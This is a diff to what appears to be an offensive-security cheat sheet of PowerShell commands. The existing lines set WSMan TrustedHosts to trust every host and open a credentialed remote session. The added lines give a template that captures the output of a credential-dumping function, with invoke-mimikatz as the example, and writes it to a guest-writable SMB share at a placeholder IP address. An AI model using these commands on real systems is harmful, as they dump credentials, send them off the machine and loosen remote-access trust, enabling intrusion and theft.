@@ -28,3 +28,8 @@ Powershell remote session:
 Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
 $cred=Get-Credential "$env:USERDOMAIN\$env:USERNAME"
 Enter-PSSession -ComputerName 192.168.1.2 -Credential $cred
+
+Powershell output to SMB share:
+#script content here
+$A = function_name_for_above_script_here #example: invoke-mimikatz
+Out-File -FilePath \\IP_ADDR_HERE\guest_writable_smb_share_name_here\output_filename_here.txt -InputObject $A -Encoding ASCII
